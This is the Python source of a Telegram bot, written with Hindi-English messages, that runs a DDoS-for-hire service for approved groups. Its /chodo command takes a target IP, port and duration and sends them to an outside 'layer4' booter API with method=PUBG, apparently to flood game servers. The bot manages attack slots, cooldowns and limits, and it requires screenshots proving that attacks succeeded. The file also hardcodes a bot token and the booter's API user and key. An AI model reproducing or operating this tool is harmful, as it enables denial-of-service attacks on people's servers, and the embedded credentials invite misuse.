import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import re
from datetime import datetime, timedelta
import time
import requests
import json

BOT_TOKEN = "8742716008:AAFP1p59p4jVl7jJuuiQPkSMxZAlFLpFysE"

BOT_OWNER = 7646520243
REQUIRED_CHANNEL = -1002668305106

bot = telebot.TeleBot(BOT_TOKEN)

DATA_FILE = "grp_data.json"

API_LIST = [
    "https://beamed.cc/layer4/?user=4988&key=KlkOr6OcnuGYkhrW&host={ip}&port={port}&time={time}&method=PUBG&concs=1"
    
]

DEFAULT_MAX_ATTACK_TIME = 120
DEFAULT_COOLDOWN = 120
PORT_BLOCK_DURATION = 7200

def load_data():
    try:
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    except:
        return {
            "approved_groups": [],
            "banned_users": [],
            "feedbacks": [],
            "max_attack_time": DEFAULT_MAX_ATTACK_TIME,
            "cooldown": DEFAULT_COOLDOWN
        }

def save_data():
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2, default=str)

data = load_data()

active_attacks = {}
user_cooldowns = {}
pending_feedback = {}
api_in_use = {}
user_attack_history = {}
_attack_lock = threading.Lock()

def is_owner(user_id):
    return user_id == BOT_OWNER

def is_approved_group(chat_id):
    return chat_id in data.get("approved_groups", [])

def is_banned(user_id):
    return user_id in data.get("banned_users", [])

def is_group(message):
    return message.chat.type in ['group', 'supergroup']

def is_channel_member(user_id):
    try:
        member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def check_access(message):
    user_id = message.from_user.id

    if is_owner(user_id) and not is_group(message):
        return True

    if not is_group(message):
        bot.reply_to(message, "🚫 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗳𝗼𝗿 𝗣𝗲𝗿𝘀𝗼𝗻𝗮𝗹 𝗨𝘀𝗲\n\nYe bot sirf approved groups me kaam karta hai.")
        return False

    if not is_channel_member(user_id):
        bot.reply_to(message, "🚫 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗝𝗼𝗶𝗻 𝗞𝗮𝗿𝗼!\n\nPehle channel join karo, tabhi bot use kar paoge.\n\n👉 https://t.me/+xdA4xwra0g4wNjI1")
        return False

    if not is_approved_group(message.chat.id):
        bot.reply_to(message, "🚫 Ye group approved nahi hai!\n\nOwner se approve karwao.")
        return False

    if is_banned(user_id):
        bot.reply_to(message, "🚫 Tum banned ho! Owner se contact karo.")
        return False

    return True

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

def get_user_cooldown(user_id):
    with _attack_lock:
        if user_id not in user_cooldowns:
            return 0
        cooldown_end = user_cooldowns[user_id]
        remaining = (cooldown_end - datetime.now()).total_seconds()
        if remaining <= 0:
            del user_cooldowns[user_id]
            return 0
        return int(remaining)

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                return True
        return False

def get_active_attack_count():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        return len(active_attacks)

def get_free_api_index():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        busy_indices = set(api_in_use.values())
        for i in range(len(API_LIST)):
            if i not in busy_indices:
                return i
        return None

def has_pending_feedback(user_id):
    return user_id in pending_feedback

def is_port_blocked(target, port):
    key = f"{target}:{port}"
    blocked = data.get("blocked_ports", {})
    if key in blocked:
        block_time = datetime.strptime(blocked[key], '%d-%m-%Y %H:%M:%S')
        if (datetime.now() - block_time).total_seconds() < PORT_BLOCK_DURATION:
            remaining = PORT_BLOCK_DURATION - (datetime.now() - block_time).total_seconds()
            return True, int(remaining)
        else:
            del blocked[key]
            save_data()
    return False, 0

def check_port_protection(user_id, target, port):
    if not data.get("port_protection", False):
        return False, 0
    key = f"{target}:{port}"
    if user_id in user_attack_history and key in user_attack_history[user_id]:
        last_attack = user_attack_history[user_id][key]
        elapsed = (datetime.now() - last_attack).total_seconds()
        if elapsed < PORT_BLOCK_DURATION:
            remaining = PORT_BLOCK_DURATION - elapsed
            return True, int(remaining)
    return False, 0

def start_attack(target, port, duration, message, attack_id, api_index):
    try:
        user_id = message.from_user.id

        bot.reply_to(message, f"⚡ Attack Start!\n\n🎯 Target: {target}:{port}\n⏱️ Time: {duration}s\n📡 Slot: {api_index + 1}/{len(API_LIST)}\n\n📊 /status se check kro")

        api_url = API_LIST[api_index].format(ip=target, port=port, time=duration)

        try:
            response = requests.get(api_url, timeout=10)
            print(f"Slot {api_index + 1} attack sent: {response.status_code}")
        except Exception as e:
            print(f"API error (Slot {api_index + 1}): {e}")

        if user_id not in user_attack_history:
            user_attack_history[user_id] = {}
        user_attack_history[user_id][f"{target}:{port}"] = datetime.now()

        time.sleep(duration)

        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]

        pending_feedback[user_id] = {
            'target': target,
            'port': port,
            'duration': duration,
            'time': datetime.now().strftime('%d-%m-%Y %H:%M:%S'),
            'chat_id': message.chat.id
        }

        bot.reply_to(message, f"✅ Attack Complete!\n\n🎯 Target: {target}:{port}\n⏱️ Duration: {duration}s\n\n📸 𝗔𝗯 𝘀𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 𝗯𝗵𝗲𝗷𝗼 𝗶𝘀 𝗴𝗿𝗼𝘂𝗽 𝗺𝗲!\nJab tak screenshot nahi bhejoge, next attack nahi laga paoge.")

    except Exception as e:
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
        print(f"Attack error: {e}")


@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id

    if not is_group(message) and not is_owner(user_id):
        bot.reply_to(message, "🚫 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗳𝗼𝗿 𝗣𝗲𝗿𝘀𝗼𝗻𝗮𝗹 𝗨𝘀𝗲\n\nYe bot sirf approved groups me kaam karta hai.")
        return

    if is_owner(user_id) and not is_group(message):
        bot.reply_to(message, "👑 Welcome Owner!\n\n/owner - Owner Panel dekhne ke liye")
        return

    if not is_group(message):
        return

    if not is_approved_group(message.chat.id):
        bot.reply_to(message, "🚫 Ye group approved nahi hai!\nOwner se approve karwao.")
        return

    bot.reply_to(message, "⚡ 𝗪𝗲𝗹𝗰𝗼𝗺𝗲!\n\n🎯 /chodo <ip> <port> <time> - Attack\n📊 /status - Active attacks\n❓ /help - Help")


@bot.message_handler(commands=['owner'])
def owner_panel(message):
    if not is_owner(message.from_user.id):
        return

    approved = data.get("approved_groups", [])
    banned = data.get("banned_users", [])

    port_prot = "ON ✅" if data.get("port_protection", False) else "OFF ❌"
    blocked_count = len(data.get("blocked_ports", {}))
    feedback_count = len(data.get("feedbacks", []))

    text = f"""👑 𝗢𝗪𝗡𝗘𝗥 𝗣𝗔𝗡𝗘𝗟

📊 𝗦𝘁𝗮𝘁𝘀:
• Approved Groups: {len(approved)}
• Banned Users: {len(banned)}
• Max Attack Time: {data.get('max_attack_time', DEFAULT_MAX_ATTACK_TIME)}s
• Cooldown: {data.get('cooldown', DEFAULT_COOLDOWN)}s
• Port Protection: {port_prot}
• Blocked Ports: {blocked_count}
• Feedbacks: {feedback_count}
• API Slots: {len(API_LIST)}

📋 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:

🔹 𝗚𝗿𝗼𝘂𝗽 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁:
• /approve - Group approve karo
• /disapprove - Group disapprove karo
• /approved_groups - Approved groups list

🔹 𝗨𝘀𝗲𝗿 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁:
• /ban <user_id> - User ban karo
• /unban <user_id> - User unban karo
• /banned_list - Banned users list

🔹 𝗦𝗲𝘁𝘁𝗶𝗻𝗴𝘀:
• /settime <seconds> - Max attack time
• /setcooldown <seconds> - Cooldown set karo

🔹 𝗣𝗼𝗿𝘁 𝗣𝗿𝗼𝘁𝗲𝗰𝘁𝗶𝗼𝗻:
• /port_protection on/off - Protection toggle
• /block_port <ip> <port> - Port block karo (2hr)
• /unblock_port <ip> <port> - Port unblock karo
• /blocked_ports - Blocked ports list

🔹 𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸:
• /feedbacks - Sab feedbacks dekho
• /clear_feedbacks - Feedbacks clear karo"""

    bot.reply_to(message, text)


@bot.message_handler(commands=['approve'])
def approve_group(message):
    if not is_owner(message.from_user.id):
        return

    if is_group(message):
        chat_id = message.chat.id
        chat_title = message.chat.title or str(chat_id)
        if chat_id not in data.get("approved_groups", []):
            if "approved_groups" not in data:
                data["approved_groups"] = []
            data["approved_groups"].append(chat_id)
            save_data()
            bot.reply_to(message, f"✅ Group Approved!\n\n📛 Name: {chat_title}\n🆔 ID: {chat_id}")
        else:
            bot.reply_to(message, "⚠️ Ye group pehle se approved hai!")
    else:
        bot.reply_to(message, "⚠️ Ye command sirf group me use karo!")


@bot.message_handler(commands=['disapprove'])
def disapprove_group(message):
    if not is_owner(message.from_user.id):
        return

    if is_group(message):
        chat_id = message.chat.id
        if chat_id in data.get("approved_groups", []):
            data["approved_groups"].remove(chat_id)
            save_data()
            bot.reply_to(message, f"❌ Group Disapproved!\n\n🆔 ID: {chat_id}")
        else:
            bot.reply_to(message, "⚠️ Ye group approved nahi tha!")
    else:
        parts = message.text.split()
        if len(parts) == 2:
            try:
                gid = int(parts[1])
                if gid in data.get("approved_groups", []):
                    data["approved_groups"].remove(gid)
                    save_data()
                    bot.reply_to(message, f"❌ Group {gid} Disapproved!")
                else:
                    bot.reply_to(message, "⚠️ Ye group approved nahi tha!")
            except:
                bot.reply_to(message, "⚠️ Invalid group ID!")
        else:
            bot.reply_to(message, "⚠️ Group me jaake /disapprove karo ya /disapprove <group_id>")


@bot.message_handler(commands=['approved_groups'])
def show_approved_groups(message):
    if not is_owner(message.from_user.id):
        return

    groups = data.get("approved_groups", [])
    if not groups:
        bot.reply_to(message, "📋 Koi approved group nahi hai!")
        return

    text = "📋 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗚𝗿𝗼𝘂𝗽𝘀:\n\n"
    for i, gid in enumerate(groups, 1):
        try:
            chat = bot.get_chat(gid)
            name = chat.title or str(gid)
        except:
            name = "Unknown"
        text += f"{i}. {name} ({gid})\n"

    bot.reply_to(message, text)


@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_owner(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /ban <user_id>")
        return

    try:
        uid = int(parts[1])
        if uid == BOT_OWNER:
            bot.reply_to(message, "❌ Owner ko ban nahi kar sakte!")
            return
        if "banned_users" not in data:
            data["banned_users"] = []
        if uid not in data["banned_users"]:
            data["banned_users"].append(uid)
            save_data()
            bot.reply_to(message, f"🚫 User {uid} Banned!")
        else:
            bot.reply_to(message, "⚠️ Ye user pehle se banned hai!")
    except:
        bot.reply_to(message, "❌ Invalid user ID!")


@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_owner(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /unban <user_id>")
        return

    try:
        uid = int(parts[1])
        if uid in data.get("banned_users", []):
            data["banned_users"].remove(uid)
            save_data()
            bot.reply_to(message, f"✅ User {uid} Unbanned!")
        else:
            bot.reply_to(message, "⚠️ Ye user banned nahi tha!")
    except:
        bot.reply_to(message, "❌ Invalid user ID!")


@bot.message_handler(commands=['banned_list'])
def banned_list(message):
    if not is_owner(message.from_user.id):
        return

    banned = data.get("banned_users", [])
    if not banned:
        bot.reply_to(message, "📋 Koi banned user nahi hai!")
        return

    text = "🚫 𝗕𝗮𝗻𝗻𝗲𝗱 𝗨𝘀𝗲𝗿𝘀:\n\n"
    for i, uid in enumerate(banned, 1):
        text += f"{i}. {uid}\n"

    bot.reply_to(message, text)


@bot.message_handler(commands=['settime'])
def set_max_time(message):
    if not is_owner(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /settime <seconds>")
        return

    try:
        t = int(parts[1])
        if t < 10 or t > 600:
            bot.reply_to(message, "❌ Time 10-600 seconds ke beech hona chahiye!")
            return
        data["max_attack_time"] = t
        save_data()
        bot.reply_to(message, f"✅ Max attack time set: {t}s")
    except:
        bot.reply_to(message, "❌ Invalid number!")


@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if not is_owner(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /setcooldown <seconds>")
        return

    try:
        c = int(parts[1])
        if c < 0 or c > 600:
            bot.reply_to(message, "❌ Cooldown 0-600 seconds ke beech hona chahiye!")
            return
        data["cooldown"] = c
        save_data()
        bot.reply_to(message, f"✅ Cooldown set: {c}s")
    except:
        bot.reply_to(message, "❌ Invalid number!")


@bot.message_handler(commands=['port_protection'])
def toggle_port_protection(message):
    if not is_owner(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 2 or parts[1].lower() not in ['on', 'off']:
        bot.reply_to(message, "⚠️ Usage: /port_protection on/off")
        return

    state = parts[1].lower() == 'on'
    data["port_protection"] = state
    save_data()
    status = "ON ✅" if state else "OFF ❌"
    bot.reply_to(message, f"🛡️ Port Protection: {status}\n\nSame IP:Port pe 2 ghante tak dobara attack nahi hoga.")


@bot.message_handler(commands=['block_port'])
def block_port(message):
    if not is_owner(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /block_port <ip> <port>")
        return

    ip = parts[1]
    port = parts[2]

    if not validate_target(ip):
        bot.reply_to(message, "❌ Invalid IP!")
        return

    try:
        p = int(port)
        if p < 1 or p > 65535:
            bot.reply_to(message, "❌ Invalid port!")
            return
    except:
        bot.reply_to(message, "❌ Invalid port!")
        return

    key = f"{ip}:{port}"
    if "blocked_ports" not in data:
        data["blocked_ports"] = {}
    data["blocked_ports"][key] = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
    save_data()
    bot.reply_to(message, f"🚫 Port Blocked!\n\n🎯 {key}\n⏳ 2 ghante ke liye")


@bot.message_handler(commands=['unblock_port'])
def unblock_port(message):
    if not is_owner(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /unblock_port <ip> <port>")
        return

    key = f"{parts[1]}:{parts[2]}"
    blocked = data.get("blocked_ports", {})
    if key in blocked:
        del blocked[key]
        save_data()
        bot.reply_to(message, f"✅ Port Unblocked: {key}")
    else:
        bot.reply_to(message, f"❌ Ye port blocked nahi hai: {key}")


@bot.message_handler(commands=['blocked_ports'])
def list_blocked_ports(message):
    if not is_owner(message.from_user.id):
        return

    blocked = data.get("blocked_ports", {})
    if not blocked:
        bot.reply_to(message, "📋 Koi blocked port nahi hai!")
        return

    now = datetime.now()
    text = "🚫 𝗕𝗹𝗼𝗰𝗸𝗲𝗱 𝗣𝗼𝗿𝘁𝘀:\n\n"
    for i, (key, t) in enumerate(blocked.items(), 1):
        block_time = datetime.strptime(t, '%d-%m-%Y %H:%M:%S')
        elapsed = (now - block_time).total_seconds()
        remaining = max(0, PORT_BLOCK_DURATION - elapsed)
        mins = int(remaining // 60)
        text += f"{i}. {key} - {mins} min baaki\n"

    bot.reply_to(message, text)


@bot.message_handler(commands=['feedbacks'])
def view_feedbacks(message):
    if not is_owner(message.from_user.id):
        return

    feedbacks = data.get("feedbacks", [])
    if not feedbacks:
        bot.reply_to(message, "📋 Koi feedback nahi hai!")
        return

    text = "💬 𝗔𝗹𝗹 𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸𝘀:\n\n"
    for i, fb in enumerate(feedbacks[-20:], 1):
        text += f"{i}. @{fb['username']} ({fb['user_id']})\n"
        text += f"   📍 {fb.get('group', 'N/A')}\n"
        text += f"   🕐 {fb['time']}\n"
        if fb.get('screenshot'):
            text += f"   📸 Screenshot attached\n"
        text += "\n"

    if len(feedbacks) > 20:
        text += f"\n(Last 20 of {len(feedbacks)} feedbacks)"

    bot.reply_to(message, text)


@bot.message_handler(commands=['clear_feedbacks'])
def clear_feedbacks(message):
    if not is_owner(message.from_user.id):
        return

    data["feedbacks"] = []
    save_data()
    bot.reply_to(message, "✅ Sab feedbacks clear ho gaye!")


@bot.message_handler(commands=['chodo'])
def handle_attack(message):
    if not check_access(message):
        return

    user_id = message.from_user.id

    if not is_owner(user_id) and has_pending_feedback(user_id):
        bot.reply_to(message, "❌ Pehle screenshot bhejo!\n\n📸 Pichle attack ka screenshot is group me bhejo, tabhi next attack laga paoge.")
        return

    if not is_owner(user_id):
        cooldown = get_user_cooldown(user_id)
        if cooldown > 0:
            bot.reply_to(message, f"⏳ Cooldown active! Wait: {cooldown}s")
            return

    if user_has_active_attack(user_id):
        bot.reply_to(message, "❌ Tumhara pehle se attack chal raha hai! Khatam hone do.")
        return

    active_count = get_active_attack_count()
    max_concurrent = len(API_LIST)
    if active_count >= max_concurrent:
        bot.reply_to(message, f"❌ Abhi attack chal raha hai! ({active_count}/{max_concurrent})\n\n/status se check kro.")
        return

    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /chodo <ip> <port> <time>")
        return

    target, port, duration = command_parts[1], command_parts[2], command_parts[3]

    if not validate_target(target):
        bot.reply_to(message, "❌ Invalid IP!")
        return

    try:
        port = int(port)
        if port < 1 or port > 65535:
            bot.reply_to(message, "❌ Invalid port! (1-65535)")
            return
        duration = int(duration)

        blocked, remaining = is_port_blocked(target, port)
        if blocked:
            mins = remaining // 60
            bot.reply_to(message, f"🚫 Ye IP:Port blocked hai!\n\n🎯 {target}:{port}\n⏳ {mins} min baaki")
            return

        if not is_owner(user_id):
            protected, p_remaining = check_port_protection(user_id, target, port)
            if protected:
                mins = p_remaining // 60
                bot.reply_to(message, f"🛡️ Port Protection Active!\n\n🎯 {target}:{port}\n⏳ Same IP:Port pe 2 ghante baad attack kar sakte ho\n⏳ {mins} min baaki")
                return

        max_time = data.get('max_attack_time', DEFAULT_MAX_ATTACK_TIME)
        if not is_owner(user_id) and duration > max_time:
            bot.reply_to(message, f"❌ Max time: {max_time}s")
            return

        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        api_index = get_free_api_index()

        if api_index is None:
            bot.reply_to(message, "❌ Sab slots busy hain! Thoda wait karo.")
            return

        with _attack_lock:
            cooldown_time = data.get('cooldown', DEFAULT_COOLDOWN)
            total_cooldown = duration + cooldown_time
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=total_cooldown)

            api_in_use[attack_id] = api_index
            active_attacks[attack_id] = {
                'target': target,
                'port': port,
                'duration': duration,
                'user_id': user_id,
                'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration)
            }

        thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, api_index))
        thread.start()

    except ValueError:
        bot.reply_to(message, "❌ Port aur time numbers hone chahiye!")


@bot.message_handler(commands=['status'])
def status_command(message):
    if not check_access(message):
        return

    active_count = get_active_attack_count()

    if active_count == 0:
        bot.reply_to(message, "📊 Koi active attack nahi hai.")
        return

    text = f"📊 𝗔𝗰𝘁𝗶𝘃𝗲 𝗔𝘁𝘁𝗮𝗰𝗸𝘀: {active_count}\n\n"
    with _attack_lock:
        now = datetime.now()
        for aid, atk in active_attacks.items():
            if atk['end_time'] > now:
                remaining = int((atk['end_time'] - now).total_seconds())
                text += f"🎯 {atk['target']}:{atk['port']} - {remaining}s left\n"

    bot.reply_to(message, text)


@bot.message_handler(commands=['help'])
def help_command(message):
    if not is_group(message) and is_owner(message.from_user.id):
        owner_panel(message)
        return

    if not check_access(message):
        return

    text = """❓ 𝗛𝗲𝗹𝗽 𝗠𝗲𝗻𝘂

🎯 /chodo <ip> <port> <time> - Attack start
📊 /status - Active attacks dekho
❓ /help - Ye menu

📸 Attack ke baad screenshot bhejni zaruri hai next attack ke liye!"""

    bot.reply_to(message, text)


@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    if not is_group(message):
        if not is_owner(message.from_user.id):
            bot.reply_to(message, "🚫 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗳𝗼𝗿 𝗣𝗲𝗿𝘀𝗼𝗻𝗮𝗹 𝗨𝘀𝗲")
        return

    if not is_approved_group(message.chat.id):
        return

    user_id = message.from_user.id

    if is_banned(user_id):
        return

    if not has_pending_feedback(user_id):
        return

    username = message.from_user.username or message.from_user.first_name or str(user_id)
    fb_info = pending_feedback[user_id]

    if "feedbacks" not in data:
        data["feedbacks"] = []

    data["feedbacks"].append({
        "user_id": user_id,
        "username": username,
        "target": f"{fb_info['target']}:{fb_info['port']}",
        "duration": fb_info['duration'],
        "screenshot": True,
        "time": datetime.now().strftime('%d-%m-%Y %H:%M:%S'),
        "group": message.chat.title or str(message.chat.id)
    })
    save_data()

    del pending_feedback[user_id]

    bot.reply_to(message, f"✅ 𝗦𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 𝗖𝗼𝗻𝗳𝗶𝗿𝗺𝗲𝗱!\n\n👤 User: @{username}\n🎯 Target: {fb_info['target']}:{fb_info['port']}\n⏱️ Duration: {fb_info['duration']}s\n\n✅ Ab tum next attack laga sakte ho!")


@bot.message_handler(func=lambda m: True)
def handle_other(message):
    if not is_group(message) and not is_owner(message.from_user.id):
        bot.reply_to(message, "🚫 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗳𝗼𝗿 𝗣𝗲𝗿𝘀𝗼𝗻𝗮𝗹 𝗨𝘀𝗲\n\nYe bot sirf approved groups me kaam karta hai.")


print("Group Bot starting...")
while True:
    try:
        bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"Polling error: {e}")
        time.sleep(5)
